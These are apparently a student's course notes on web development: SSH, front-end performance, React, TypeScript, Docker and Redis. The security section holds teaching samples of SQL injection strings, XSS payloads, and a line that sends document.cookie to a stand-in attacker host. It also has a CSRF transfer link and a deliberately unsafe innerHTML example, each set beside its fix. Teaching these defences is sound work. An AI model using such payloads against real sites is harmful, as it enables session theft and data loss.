# The Complete Junior to Senior Web Developer Roadmap 2020 Course


## SSH

- ssh user@host (Access the host remotely) (Secure Shell Protocol)
- git clone repositoryurl
- rsync
	- cd directorypath (The directory I want to copy to the server)
	- rsync -av . user@host:serverdirectorypath (Copy all files recursively)

### How SSH works

- symmetrical encryption
- asymmetrical encryption
- hashing
- Symmetrical encryption (Only 1 secrect key)
	- The secret key is specific to each SSH session and is generated prior to something called Kline's authentication
- Key exchange algorithm (Asymmetrical encryption)
- Asymmetrical encryption (Public key and private key) (Is more time consuming)
- Diffie Hellman key exchange
	- The asymmetrical encryption is actually only used by SSH during the key exchange algorithm of symmetric encryption to generate the symmetric key without it entering the public. Before we initiate a secure connection both parties generate temporary public and private keys and share their respective keys, and at this point we're able to get the symmetric key, so we can exchange method messages using something called the Diffie Hellman key exchange.
	- What it does basically is that it uses a bit of public and private key information to generate without ever exchanging the keys. Each machine on its computer can generate this symmetric key from data from each computer.
- To avoid a third part change the message, a hash (called Mac) that contains a packet sequence number plus the symmetric key and the message  is used to ensure message integrity. This is done using something called HMX or hash based message authentication codes.

### SSH 4 steps

- Diffie-Hellman Key Exchange
- Arrive at Symmetric Key
- Make sure of no funny business
- Authenticate User with password or RSA (Password is not recommended, we must use RSA)

### RSA

- cd ~/.ssh (client)
- ssh-keygen (client)
- pbcopy < ~/.ssh/id_rsa.pub (client) (Copy to clipboard)
- ~/.ssh/authorized_keys (server) (Edit the file and paste in new line)
- ssh-add -D (client) (remove all identities) (In case of multiple keys)
- ssh-add ~/.ssh/id_rsa_other (client) (In case of multiple keys)
- ssh-add -l (client) (view all identities) (In case of multiple keys)
- Recommended ssh-keygen command:
	- ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
- ssh -tt host1@address ssh -tt host2@address ... (Tunneling)


## Performance part 1

### 3 Keys to performance

- Frontend
	- Critical Render Path
	- Optimized Code
	- Progressive Web App

- Network Transfer
	- Minimize Files
	- Minimize Delivery

- Backend
	- CDNs
	- Caching
	- Load Balancing
	- DB Scaling
	- GZIP

### Network Transfer

- Minimize Files
	- Minimize Text
		- JS, CSS, HTML - Uglify
	- Minimize Images
		- JPG - Complex images with a lot of colors such as photographs. JPG don't really allow for transparency.
		- GIF: Usually limit the number of colors. Allow transparency. Using in animations.
		- PNG: Usually limit the number of colors and tend to be a lot smaller in size than JPG. Allow transparency. Using for logos for example and things that only have a few sets of colors that you need.
		- SVG: Are vector graphics. They usually tend to be very simplistic visual things with few colors.
	- Minimize Images Rules
		- If you want transparency: use a PNG
		- If you want animations: use a GIF
		- If you want colourful images: use a JPG
		- If you want simple icons, logos and illustrations: use a SVG
		- Reduce PNG with TinyPNG
		- Reduce JPG with JPEG-optimizer
		- Try to choose simple illustrations over highly detailed photographs
		- Always lower JPEG image quality (30-60%)
		- Resize image based on size it will be displayed
		- Display different sized images for different backgrounds (Media queries)
		- Use CDNs like imigx (https://www.imgix.com/)
		- Remove image metadata (https://www.verexif.com/en/)
- Minimize Delivery
	- Less trips
	- HTTP Protocol allow only simultaneously download a set maximum number of files from one domain at a time. And this ranges from 2 to 6 depending on your browser.
	- We want to minimize files and we want to limit the strips that the "delivery man" makes.

### Critical Rendering Path

![Critical Rendering Path](https://miro.medium.com/max/1878/0*A24XmmK2IUz0wvkg.png)

- Steps:
	- Process HTML markup and build the DOM tree.
	- Process CSS markup and build the CSSOM tree.
	- Combine the DOM and CSSOM into a render tree.
	- Run layout on the render tree to compute geometry of each node.
	- Paint the individual nodes to the screen.

Optimizing the critical rendering path is the process of minimizing the total amount of time spent performing steps 1 through 5 in the above sequence.

When a user requests a page for your site the page HTML starts streaming to the browser. As soon as a browser encounters a tag for an external imagem, script or css file, it will start downloading the file simultaneously. When the browser receives thge HTML it does something called parsing.

After understanding the document this is what it does it starts creating the DOM, and again as it's building that as soon as it sees an external resource it goes ahead and starts downloading all of those.

> Usually the css and javascript files take high priority and other files like images take lower priority.

- So how do we optimize this process?

- Step 1 (HTML):

Well the first thing you want to do is to load styles that is CSS files as soon as possible and script that is javascript files as late as possible with a few exceptions here and there.
So if you put javascript in the head tag in HTML, the problem with that positioning if it's at the top is that it blocks page rendering scripts historically blocked additional resources from being downloaded more quickly.
By replacing them at the bottom or by placing them at the bottom (After end body tag) you're style content and media could start downloading more quickly given the perception of improved performance.

> Load style tag in the head tag
> Load script right before closing the body tag

- Step2 (CSS):

CSS is called render blocking because in order to construct the rendered tree and print something onto the screen we're waiting for the CSS DOM to complete and combine it with the Dom to create the render tree, so CSS is rendered blocking.

> Internal ou inline styleshees are more faster than external css files.

	- Only load whatever is needed.
	- Above the fold loading.
```javascript
	const loadStyleSheet = src => {
		if (document.createStylesheet) {
			document.createStylesheet(src);
		} else {
			const stylesheet = document.createElement('link');
			stylesheet.href = src;
			stylesheet.type = 'text/css'
			stylesheet.rel = 'stylesheet'
			document.getElementsByTagName('head')[0].appendChild(stylesheet);
		}
	}

	window.onload = function() {
		loadStyleSheet('./style.css');
	}
```
	- Media attributes.
```css
@media only screen and (min-width: 768px) {
    /* tablets and desktop */
}

@media only screen and (max-width: 767px) {
    /* phones */
}

@media only screen and (max-width: 767px) and (orientation: portrait) {
    /* portrait phones */
}
```
or
```html
<link rel="stylesheet" href="./style.css" media="only screen and (min-width:500px)">
```
	- Less specificity.
```css
/* bad */
.header .nav .item .link a.important {
	color: pink;
}

/* good */
a.important {
	color: pink;
}
```

- Step3 (JavaScript):

	- Load Scripts asynchronously
	- Defer Loading of scripts
	- Minimize DOM manipulation
	- Avoid long running Javascript

![Loading Third-Party JavaScript](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/loading-third-party-javascript/images/image_13.png)

```html
<script type="text/javascript"></script>
<!-- Critical scripts or your app script -->

<script type="text/javascript" async></script>
<!-- If the core functionality requires javascript -->
<!-- Third part scripts that don't affect the DOM -->

<script type="text/javascript" defer></script>
<!-- If the core functionality does not require javascript -->
<!-- Any third part scripts that arent that important and aren't above the fold -->
```

> Your HTML will display quicker in older browsers if you keep the scripts at the end of the body right before closing the body tag. So, to preserve the load speed in older browsers, you don't want to put them anywhere else.

> If your second script depends upon the first script (e.g. your second script uses the jQuery loaded in the first script), then you can't make them async without additional code to control execution order, but you can make them defer because defer scripts will still be executed in order, just not until after the document has been parsed. If you have that code and you don't need the scripts to run right away, you can make them async or defer.

- Tools for testing:
	- [PageSpeed Insights](https://developers.google.com/speed/pagespeed/insights/)
	- [WebPageTest](https://www.webpagetest.org/)

- [Prefetching, preloading, prebrowsing](https://css-tricks.com/prefetching-preloading-prebrowsing/) are other performance enhancing techniques.


## React + Redux

[React code example - Robofriends project](https://github.com/aneagoie/robofriends)

[React + Redux code example - Robofriends project](https://github.com/aneagoie/robofriends-redux)


## Performance part 2

### Optimizing Code

Only load what is needed:
	- Code Splitting
	- Tree Shaking
Avoid blocking main thread
Avoid Memory Leaks
Avoid Multiple re-rendering

- Code Splitting in React
	- Modern web sites ship a lot of javascript. It is common to bundle scripts into large files or a bundled file. We just had one massive javascript file that was created by combining all our smaller ones and sending it as soon as the user enters our website. Now this was done because a large amount of requests were detrimental to your performance initially. However as JavaScript lines increased the files were becoming bigger and bigger and bigger.
	- To avoid winding up with a large bundle, it’s good to get ahead of the problem and start “splitting” your bundle. Code-Splitting is a feature which can create multiple bundles that can be dynamically loaded at runtime.
	- Code-splitting your app can help you “lazy-load” just the things that are currently needed by the user, which can dramatically improve the performance of your app.
	- There are Route-based code splitting and Component-based code splitting according to [React documentation](https://reactjs.org/docs/code-splitting.html).
- Error boundaries in React
	- A JavaScript error in a part of the UI shouldn’t break the whole app. To solve this problem for React users, React 16 introduces a new concept of an “error boundary”.
	- Error boundaries are React components that catch JavaScript errors anywhere in their child component tree, log those errors, and display a fallback UI instead of the component tree that crashed. Error boundaries catch errors during rendering, in lifecycle methods, and in constructors of the whole tree below them.
	- [Error boundaries - React documentation](https://reactjs.org/docs/error-boundaries.html)
- Optimizing Performance in React
	- We can install this plugin into our chrome browser to help us with React development:
		- [React Developer Tools](https://reactjs.org/docs/optimizing-performance.html).
		- This can be useful for identifying components that are being loaded unnecessarily, especially using the Highlight update option.
	- To view performance metrics for our react app:
		- Append ?react_perf to your local server URL (e.g. localhost:3000/?react_perf) and visit that URL in a browser (in Chrome devtools, in the performance tab for example).
	- Internally, React uses several clever techniques to minimize the number of costly DOM operations required to update the UI. For many applications, using React will lead to a fast user interface without doing much work to specifically optimize for performance. Nevertheless, there are several ways you can speed up your React application:
		- [Optimizing Performance - React documentation](https://reactjs.org/docs/error-boundaries.html).
	- [Beware: React setState is asynchronous!](https://medium.com/@wereHamster/beware-react-setstate-is-asynchronous-ce87ef1a9cf3)
		- setState() does not immediately mutate this.state but creates a pending state transition. Accessing this.state after calling this method can potentially return the existing value.
	- [shouldComponentUpdate()](https://reactjs.org/docs/react-component.html#shouldcomponentupdate)
		- Use shouldComponentUpdate() to let React know if a component’s output is not affected by the current change in state or props. The default behavior is to re-render on every state change.
		- React.PureComponent is similar to React.Component. The difference between them is that React.Component doesn’t implement shouldComponentUpdate(), but React.PureComponent implements it with a shallow prop and state comparison. However, if you use complex data structures like deeply nested objects it may miss some props changes and not update the components. shouldComponentUpdate() does the same thing but you have a bit of control.
	- [why-did-you-render](https://www.npmjs.com/package/@welldone-software/why-did-you-render)
		- why-did-you-render patches React to notify you about avoidable re-renders. (Works with React Native as well.)

### Progressive Web Apps

Progressive Web Apps are web apps that use emerging web browser APIs and features along with traditional progressive enhancement strategy to bring a native app-like user experience to cross-platform web applications. Progressive Web Apps are a useful design pattern, though they aren't a formalized standard.

- [Lighthouse](https://developers.google.com/web/tools/lighthouse)
	- Lighthouse is an open-source, automated tool for improving the quality of web pages. You can run it against any web page, public or requiring authentication. It has audits for performance, accessibility, progressive web apps, SEO and more.

In order to call a Web App a PWA, technically speaking it should have the following features: Secure contexts (HTTPS), one or more Service Workers, and a manifest file.

- Secure contexts (HTTPS)
	- The web application must be served over a secure network. Being a secure site is not only a best practice, but it also establishes your web application as a trusted site especially if users need to make secure transactions. Most of the features related to a PWA such as geolocation and even service workers are available only once the app has been loaded using HTTPS.
	- [Let's Encrypt](https://letsencrypt.org/docs/)
- Manifest file
	- A JSON file that controls how your app appears to the user and ensures that progressive web apps are discoverable. It describes the name of the app, the start URL, icons, and all of the other details necessary to transform the website into an app-like format.
	- [Favicon Generator](https://realfavicongenerator.net/)
		-  All we need to do is provide an image and download it in different sizes and reference them in the manifest.
		- Another thing that this web site does is previewing and customizing the splash screen.
- Service workers
	- A service worker is a script that allows intercepting and control of how a web browser handles its network requests and asset caching. With service workers, web developers can create reliably fast web pages and offline experiences.
	- ![Service workers Diagram](https://miro.medium.com/max/1200/0*dVlfyYWOH1GnGNeL.jpg)

[Making a Progressive Web App](https://create-react-app.dev/docs/making-a-progressive-web-app/)

[Deployment on GitHub Pages](https://create-react-app.dev/docs/deployment/#github-pages)

[Progressive Tooling - A list of community-built, third-party tools that can be used to improve page performance](https://progressivetooling.com/)

[PWA code example - Robofriends project](https://github.com/aneagoie/robofriends-pwa)


## Testing

[Testing code example - Robofriends project](https://github.com/aneagoie/robofriends-testing)


## TypeScript

### Compiled vs. Interpreted and Type Checking (Statically type-checked languages vs. Dynamically type-checked languages)

#### Compiled vs. Interpreted

When source code is translated.

- Source Code: Original code (usually typed by a human into a computer)
- Translation: Converting source code into something a computer can read (i.e. machine code)
- Run-Time: Period when program is executing commands (after compilation, if compiled)
- Compiled: Code translated before run-time
- Interpreted: Code translated on the fly, during execution

#### Type Checking (Statically type-checked languages vs. Dynamically type-checked languages)

When types are checked. It’s the process of verifying and enforcing the constraints of types. Usually performed by the compiler or interpreter at compile or run time. 

- Static: Types checked before run-time
- Dynamic: Types checked on the fly, during execution

> "3" + 5 will raise a type error in strongly typed languages, such as Python and Go, because they don't allow for "type coercion": the ability for a value to change type implicitly in certain contexts (e.g. merging two types using +). Weakly typed languages, such as JavaScript, won't throw a type error (result: '35').

The definitions of “Static & Compiled” and “Dynamic & Interpreted” are quite similar…but remember it’s “when types are checked” vs. “when source code is translated”.

> Type-checking has nothing to do with the language being compiled or interpreted! You need to separate these terms conceptually.

Statically type-checked languages pros and cons:
- Pros
	- Give better run-time performance.
	- Is less prone to run-time errors.
- Cons
	- Do more processing before run-time (at compile time).
	- Provide less flexibility to programmer.
	
Dynamically type-checked languages pros and cons:
- Pros
	- More efficient compiler/interpreters.
	- Provides more flexibility.
- Cons
	- Type-checking at run-time affects performance.
	- More prone to run-time errors.

#### But What are Strongly Typed and Weakly Typed Languages?

It’s a spectrum (turns out, there is no official demarcation of these terms agreed throughout the industry. It’s a spectrum.).
So, this will be the terms the way they are often used.

In Strongly typed languages once a type is assigned to a variable say at run time or compile time, it retains that type and can’t be intermingled in expressions with other types easily. 

Whereas, in Weakly typed languages, once a type is assigned to a variable say at run-time or compile-time, it can be intermingled in expressions with other types easily.

![Diagram](https://hackernoon.com/photos/hgW8mkSirqYHZWLkYLGuSG13sSA3-2le963zm8)

#### Python Example (Dynamic, Interpreted):
```python
def foo(a):
    if a > 0:
        print 'Hi'
    else:
        print "3" + 5
```
```python
foo(2)
```

Because Python is both interpreted and dynamically typed, it only translates and type-checks code it’s executing on. The else block never executes, so "3" + 5 is never even looked at!

- What if it was statically typed?

A type error would be thrown before the code is even run. It still performs type-checking before run-time even though it is interpreted.

- What if it was compiled?

The else block would be translated/looked at before run-time, but because it's dynamically typed it wouldn't throw an error! Dynamically typed languages don't check types until execution, and that line never executes.

#### Performance

A compiled language will have better performance at run-time if it’s statically typed because the knowledge of types allows for machine code optimization.

Statically typed languages have better performance at run-time intrinsically due to not needing to check types dynamically while executing (it checks before running).

Similarly, compiled languages are faster at run time as the code has already been translated instead of needing to “interpret”/translate it on the fly.

Note that both compiled and statically typed languages will have a delay before running for translation and type-checking, respectively.

> Static typing catches errors early, instead of finding them during execution (especially useful for long programs). It’s more “strict” in that it won’t allow for type errors anywhere in your program and often prevents variables from changing types, which further defends against unintended errors.

References

- [I Finally Understand Static vs. Dynamic Typing and You Will Too!](https://hackernoon.com/i-finally-understand-static-vs-dynamic-typing-and-you-will-too-ad0c2bd0acc7)
- [How To Understand The Difference Between Statically - Dynamically - Strongly - Weakly Typed Language](https://hackernoon.com/actually-understand-statically-dynamically-strongly-weakly-typed-languages-axbpi3za2)

### TypeScript

TypeScript is an object-oriented programming language developed and maintained by the Microsoft Corporation. It is a typed superset of JavaScript that compiles to plain JavaScript.

TypeScript totally follows the OOPS concept and with the help of TSC (TypeScript Compiler), we can convert Typescript code (.ts file) to JavaScript (.js file).

![TypeScript](https://www.graycelltech.com/wp-content/uploads/2018/09/arrows1-1.png)

#### Overview

```ts
//boolean
let isCool: boolean = false;

//number
let age: number = 56;

//string
let eyeColor: string = 'brown';
let favoriteQuote: string = `I'm not old, I'm only ${age}`;

//Array
let pets: string[] = ['cat', 'mouse', 'dragon'];
let pets2: Array<string> = ['pig', 'lion', 'dragon'];

//Tuple
let basket: [string, number];
basket = ['basketball', 10];

//Enum
enum Size {Small = 1, Medium, Large}
let sizeName: string = Size[2];
alert(sizeName); // Displays 'Medium' as its value is 2 above

//Any
let whatever: any = 'aaaaghhhhhh noooooo!';

//void
let sing = (): void => console.log('Lalalala')

//null and undefined
let meh: undefined = undefined;
let noo: null = null;

//never
let error = (): never => {
  throw Error('blah!');
}

// Type Assertions:
let ohhithere: any = "OH HI THERE";

let strLength: number = (ohhithere as string).length;

//Interface
interface RobotArmy {
  count: number,
  type: string,
  magic?: string
}

let fightRobotArmy = (robots: RobotArmy) =>{
  console.log('FIGHT!');
}
let fightRobotArmy2 = (robots: {count: number, type: string, magic?: string}) =>{
  console.log('FIGHT!');
}

//Function
let fightRobotArmyF = (robots: RobotArmy): void =>{
  console.log('FIGHT!');
}
let fightRobotArmy2F = (robots: {count: number, type: string, magic?: string}): void =>{
  console.log('FIGHT!');
}

// *** Classes
class Animal {
    private sing: string;
    constructor(sound: string) {
        this.sing = sound;
    }
    greet() {
        return "Hello, " + this.sing;
    }
}

let lion = new Animal("Lion");
// lion.sing


//In TypeScript, there are several places where type inference
//is used to provide type information when there is no explicit
//type annotation. For example, in this code
let x = 3;
// automatimally detexts x is a number.

//Union Type
let confused: string | number = 'hello'
```

[Download TypeScript](https://www.typescriptlang.org/download)

[Compiler Options](https://www.typescriptlang.org/docs/handbook/compiler-options.html)

[TypeScript for JavaScript Programmers](https://www.typescriptlang.org/docs/handbook/typescript-in-5-minutes.html)

[tsconfig.json](https://www.typescriptlang.org/docs/handbook/tsconfig-json.html)

[DefinitelyTyped - The repository for high quality TypeScript type definitions](http://definitelytyped.org/)

[Adding TypeScript to a React project](https://create-react-app.dev/docs/adding-typescript/)

#### Cons

TypeScript adds a lot of complexity to a project:
- We have to make sure that we have the typescript files for our third party libraries (like React).
- We have to learn new types that these third party libraries provide.
- We are hoping that these declaration files are kept up to date as the actual package gets updated.

Switching to it in an existing project is definitely a lot of work and it should be strongly thought over before doing so.
Some libraries are of course written in TypeScript, such as material-ui, but some require you to install an additional types/ dependency which can be a bit annoying, not mentioning the packages that don’t support type definitions well or not at all. 

[TypeScript code example - Robofriends project](https://github.com/aneagoie/robofriends-typescript-completed)




server side rendering

csr 
pros
- Rich Interactions
- Faster Response
- Web Applications

Cons
- Low CEO Potential
- Longer initial load



ssr
Pros
- Static Sites
- SEO
- Initial Page Load

Cons
- Full Page Reloads
- Slower page rendering
- Requests to server

server side rendering
server side rendering react
nextjs
gatsby

https://medium.com/@wilbo/server-side-vs-client-side-routing-71d710e9227f

https://www.getfilecloud.com/blog/2015/03/tech-tip-how-to-do-hard-refresh-in-browsers/#.Xpm37shKjIU

next link

https://nextjs.org/learn/basics/deploying-a-nextjs-app

create next app

npm install

npm audit fix --force


npm update

npm install next@latest


https://github.com/aneagoie/next-ssr

https://github.com/aneagoie/next-ssr-update


https://developers.google.com/search/docs/guides/javascript-seo-basics

https://aerotwist.com/blog/when-everything-is-important-nothing-is/







Security

Star Of Security

- Authentication
- Do not trust anyone
- Data management
- Access control
- Secure headers
- Code secrets
- XSS & CSRF
- HTTPS everywhere
- Logging
- 3rd party libraries
- Injections





injections
- most common

' or 1=1 --'
'; DROP TABLE users; --'

https://owasp.org/www-community/Injection_Theory

to fix them:
- Sanitize input
- Parametrize Queries
- Knex.js or other ORMs


https://www.hacksplaining.com/lessons

Example that is not SQL

Client side 
```html
<!DOCTYPE html>
<html>
<head>
  <title>🔥Make Me Secure!</title>
  <link rel="stylesheet" type="text/css" href="./style.css">
</head>
<body>
  <h1>Security Playground 😱🔥</h1>
  <div>
    <input id="userinput" type="text">
    <button onclick="sendToServer()">Submit</button>
    <h2 id="pleaseNo"></h2>
  </div>
  <script src="./script.js"></script>
</body>
</html>
```

```javascript
// try inputting this: <script>alert('hi')</script>
// Now, try inputting this: <img src="/" onerror = "alert(1);">
// Scripts injected into the DOM via script tags in innerHTML
// are not run at the time they are injected (inline scripts
// are run at the time the original page is parsed). On the
// other hand, images injected into the DOM are loaded at that
// time, and if the loading fails, then the onerror event
//handler is called.
const userInputInHTML = (input) => {
  const p = document.getElementById("pleaseNo")
  // Bad
  p.innerHTML = input;

  // Better
  // var textnode = document.createTextNode(input);
  // p.appendChild(textnode);
}
const sendToServer = () => {
  const input = document.querySelector('#userinput').value;
  userInputInHTML(input)
  fetch('http://localhost:3000/secret', {
    method: 'POST',
    body: JSON.stringify({userInput: input}),
    headers: new Headers({
      'Content-Type': 'application/json'
    })
  })
```

server side

```javascript
const express = require('express')
const cors = require('cors')
const helmet = require('helmet')
var winston = require('winston');

const bodyParser = require('body-parser');
const app = express()
app.use(cors())
app.use(helmet())
app.use(bodyParser.json())

app.get('/', (req, res) => res.send('Hello World!'))

app.post('/secret', (req, res) => {
  const { userInput } = req.body;
  console.log(userInput);
  if (userInput) {
    winston.log('info', 'user input: ' + userInput);
    res.status(200).json('success');
  } else {
    winston.error('This guy is messing with us:' + userInput);
    res.status(400).json('incorrect submission')
  }
})

app.listen(3000, () => console.log('Example app listening on port 3000!'))
```

https://www.postgresql.org/download














3rd party libraries

npm install -g nsp

nsp check # audit package.json


npm install -g snyk

snyk auth

snyk test # audit node_modules directory












Logging

npm install winston

npm install morgan






https everywhere

ssl/tls certificates

- https://letsencrypt.org
- cloudflare




xss + csrf

<img src="/" onerror="alert('boom');">

window.locatiom = 'haxxed.com?cookie=' + document.cookie


<a href="http://netbank.com/transfer.do?acct=AttackerA&amount;=$100">Read more</a>


fetch('//httpbin.org/post', {method:'POST',body:document.cookie})

'Content-Security-Policy': "script-src 'self' 'https://api.google.com'"


npm install csurf


- Sanitize input
- No eval()
- No document.write()
- Content Security Policy
- Secure + HTTPOnly Cookies


https://www.hacksplaining.com/exercises/csrf


https://www.hacksplaining.com/exercises/xss-stored



https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
https://medium.com/hackernoon/cross-site-scripting-for-dummies-be30f76fad09








Code secrets

- Environmental variables
https://create-react-app.dev/docs/adding-custom-environment-variables/
https://www.npmjs.com/package/dotenv

- Commit History






Secure Headers

https://github.com/helmetjs/helmet
- npm install helmet


https://code.tutsplus.com/tutorials/http-the-protocol-every-web-developer-must-know-part-1--net-31177
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
https://www.tutorialspoint.com/http/http_header_fields.htm











Access control

- Principal of least privilege

CORS

 





 data management

 - bcrypt, scrypt, aragon2
 - pgcrypto - encrypt a few columns


https://rangle.io/blog/how-to-store-user-passwords-and-overcome-security-threats-in-2017/








 do not trust anyone

Darth Vader Is Everywher

rate limiter





Authentication

Authentication vs Authorization









https://www.hacksplaining.com/lessons

https://watchyourhack.com/

https://owasp.org/



















Code Analysis


Smart brain 
https://github.com/aneagoie/smart-brain


smart brain api
https://github.com/aneagoie/smart-brain-api



https://developer.okta.com/blog/2019/07/19/mysql-vs-postgres

https://blog.panoply.io/postgresql-vs.-mysql













Docker

https://hub.docker.com/



create Dockerfile
```
FROM node:carbon

CMD ["/bin/bash"]
```

or

```
FROM node:8.11.1

CMD ["/bin/bash"]
```

docker build -t tagname .

docker run -it tagname

change version docker file

docker build -t tagname .

docker run -it tagname

docker run tagname

https://unix.stackexchange.com/questions/398543/what-are-the-contents-of-bin-bash-and-what-do-i-do-if-i-accidentally-overwrote


docker run -t -d tagname

docker ps

docker exec -it CONTAINER ID bash

docker stop CONTAINER ID

```
FROM node:8.11.1

WORKDIR /usr/src/smart-brain-api

COPY ./ ./

RUN npm install

CMD ["/bin/bash"]
```

docker run -it -p 3000:3000 tagname

https://docs.docker.com/engine/reference/builder/#usage




docker compose

docker-compose.yml

```
version: '3.6'


services:
	smart-brain-api:
		container_name: backend
		build: ./
		command: npm start
		working_dir: /usr/src/smart-brain-api
		ports:
			- "3000:3000"
```

docker-compose build

docker-compose run smart-brain-api

everytime you change the yml file
you need to run docker-composer build 
to re-read that file


docker-compose down

docker-compose up --build




```
version: '3.6'


services:
	smart-brain-api:
		container_name: backend
		build: ./
		command: npm start
		working_dir: /usr/src/smart-brain-api
		ports:
			- "3000:3000"
		volumes:
			- ./:/usr/src/smart-brain-api
```


https://stackoverflow.com/questions/34809646/what-is-the-purpose-of-volume-in-dockerfile


https://www.linux.com/topic/cloud/docker-volumes-and-networks-compose/


docker-compose exec smart-brain-api bash



docker-compose up -d





```
version: '3.6'

services:
	# Backend API
	smart-brain-api:
		container_name: backend
		build: ./
		command: npm start
		working_dir: /usr/src/smart-brain-api
		environment:
			POSTGRES_URI: postgres://sally:secret@postgres:5432/smart-brain-docker
		links:
			- postgres
		ports:
			- "3000:3000"
		volumes:
			- ./:/usr/src/smart-brain-api

	# Postgres
	postgres:
		image: postgres
		environment:
			POSTGRES_USER: sally
			POSTGRES_PASSWORD: secret
			POSTGRES_DB: smart-brain-docker
			POSTGRES_HOST: postgres
		ports:
			- "5432:5432"
```


```
const db = knex({
	client: 'pg',
	connection: process.env.POSTGRES_URI
});
```


https://www.postgresql.org/docs/9.2/app-psql.html


https://hub.docker.com/_/postgres/


- create a postgres folder on smart-brain-api
- create a Dockerfile inside postgres folder
```
FROM postgres:10.3

ADD /tables/ /docker-entrypoint-initdb.d/tables/
ADD deploy_schemas.sql /docker-entrypoint-initdb.d/
```
- create a new folder inside postgress folder called tables
- within the tables folder create 2 foles: login.sql and user.sql (with the create table commands)
- In the SQL files use transaction
```
BEGIN TRANSACTION;

SQL COMMAND

COMMIT;
```
- create a file called deploy_schemas.sql within the postgres folder
```
-- Deploy fresh database tables
\i '/docker-entrypoint-initdb.d/tables/users.sql'
\i '/docker-entrypoint-initdb.d/tables/login.sql'
```
- Change the docker-compose.yml file
```
version: '3.6'

services:
	# Backend API
	smart-brain-api:
		container_name: backend
		build: ./
		command: npm start
		working_dir: /usr/src/smart-brain-api
		environment:
			POSTGRES_URI: postgres://sally:secret@postgres:5432/smart-brain-docker
		links:
			- postgres
		ports:
			- "3000:3000"
		volumes:
			- ./:/usr/src/smart-brain-api

	# Postgres
	postgres:
		build: ./postgres
		environment:
			POSTGRES_USER: sally
			POSTGRES_PASSWORD: secret
			POSTGRES_DB: smart-brain-docker
			POSTGRES_HOST: postgres
		ports:
			- "5432:5432"
```
- Change the deploy_schemas.sql file
```
-- Deploy fresh database tables
\i '/docker-entrypoint-initdb.d/tables/users.sql'
\i '/docker-entrypoint-initdb.d/tables/login.sql'
\i '/docker-entrypoint-initdb.d/seed/seed.sql'
```
- create another folder called seed with the file seed.sql inside
```
BEGIN TRANSACTION;

INSERT INTO users (name, email, entries, joined) VALUES ('a', 'a@gmail.com', 1, '2020-01-01');
INSERT INTO login (hash, email) VALUES ('$2y$12$ed1Dma30h074Xzb1f72qkODPXQimswqTnDksSRIRVogPwfzFDUn2W', 'a@gmail.com');

COMMIT;
```
- change dockerfile inside postgres folder
```
FROM postgres:10.3

ADD /tables/ /docker-entrypoint-initdb.d/tables/
ADD /seed/ /docker-entrypoint-initdb.d/seed/
ADD deploy_schemas.sql /docker-entrypoint-initdb.d/
```


morgan with combined config was intalled in the smart-brain-api


http://joshualande.com/create-tables-sql

https://hub.docker.com/_/postgres/


smart-brain-api dockerized
https://github.com/aneagoie/smart-brain-boost-api-dockerized/commit/a7efbdd56c9fbfb29700c3398286dedd38e56166


Update: Docker Networks
Docker is constantly evolving. One of the features that has changed is the links property you have seen in previous videos while writing our docker compose file. Links have been replaced by networks. Docker describes them as a legacy feature that you should avoid using. You can safely remove the link and the two containers will be able to refer to each other by their service name (or container_name). So in our case all you would need to do is remove the below lines from your Docker Compose file and everything should still work fine:

    links:
      - postgres
      - redis


By default Compose sets up a single network for your app. Each container for a service joins the default network and is both reachableby other containers on that network, and discoverable by them at a hostname identical to the container name. If you want a custom network, you can use the networks property.
If you want to read more about this, you can check out the official documentation here, or read this stackoverflow answer.

Don't get too confused by this though. This gets into some really advanced networking that is very specialized. The big takeaway is that you no longer need the links property.

https://docs.docker.com/network/links/

https://docs.docker.com/engine/reference/commandline/network_create/

https://docs.docker.com/compose/networking/

https://stackoverflow.com/questions/41294305/docker-compose-difference-between-network-and-link













Redis

https://image.slidesharecdn.com/moniruzzamanpptxnosqldatabase-150327224221-conversion-gate01/95/nosql-database-classification-characteristics-and-comparison-5-638.jpg?cb=1427496253

https://gpinaki.files.wordpress.com/2014/01/nosql-classification1.png

https://hub.packtpub.com/different-types-of-nosql-databases-and-when-to-use-them/

https://redis.io/

https://codeburst.io/redis-what-and-why-d52b6829813

https://www.objectrocket.com/blog/how-to/top-5-redis-use-cases/

https://stackoverflow.com/questions/52196678/what-are-atomic-operations-for-newbies

https://dev.to/trevoirwilliams/relational-sql-vs-non-relational-nosql-databases-hi5

https://redis.io/download

http://try.redis.io/

https://redis.io/commands

```
> SET name "TestName"
OK
> GET name
"TestName"
> EXISTS name
(integer) 1
> EXISTS name2
(integer) 0
> DEL name
(integer) 1
> EXISTS name
(integer) 0
> GET name
(nil)

```

```
> MSET a 2 b 5
OK
> GET a
"2"
> GET b
"5"
> MGET a b
1) "2"
2) "5"
```

https://redis.io/topics/data-types-intro

https://redis.io/topics/data-types

types
 - string
 - hashes
```
> HMSET user id 45 name "TestName"
OK
> HGET user
(error) wrong number of arguments (given 1, expected 2)
> HGET user id
"45"
> HGET user name
"TestName"
> HGETALL user
1) "id"
2) "45"
3) "name"
```
 - list
```
> LPUSH ourlist 10
(integer) 1
> RPUSH ourlist "Test"
(integer) 2
> GET ourlist
(error) WRONGTYPE Operation against a key holding the wrong kind of value
> LRANGE ourlist 0 1
1) "10"
2) "Test"
> LPUSH ourlist 55
(integer) 3
> LRANGE ourlist 0 1
1) "55"
2) "10"
> RPOP ourlist
"Test"
> LRANGE ourlist 0 1
1) "55"
2) "10"
> LRANGE ourlist 0 2
1) "55"
2) "10"
```
 - Sets (unordered) (not allowing repeated values)
```
> SADD ourset 1 2 3 4 5
(integer) 5
> SMEMBERS ourset
1) "1"
2) "2"
3) "3"
4) "4"
5) "5"
> SADD ourset 1 2 3 4
(integer) 0
> SMEMBERS ourset
1) "1"
2) "2"
3) "3"
4) "4"
5) "5"
> SADD ourset 1 2 3 4 5 6 7
(integer) 2
> SMEMBERS ourset
1) "1"
2) "2"
3) "3"
4) "4"
5) "5"
6) "6"
7) "7"
> SISMEMBER ourset 5
(integer) 1
> SISMEMBER ourset 9
(integer) 0
```
 - Ordered Sets
```
> ZADD team 50 "Wizards"
(integer) 1
> ZADD team 40 "Cavaliers"
(integer) 1
> ZRANGE team 0 1
1) "Cavaliers"
2) "Wizards"
> ZADD team 1 "Bolts"
(integer) 1
> ZRANGE team 0 2
1) "Bolts"
2) "Cavaliers"
3) "Wizards"
> ZRANK team "Wizards"
2
```















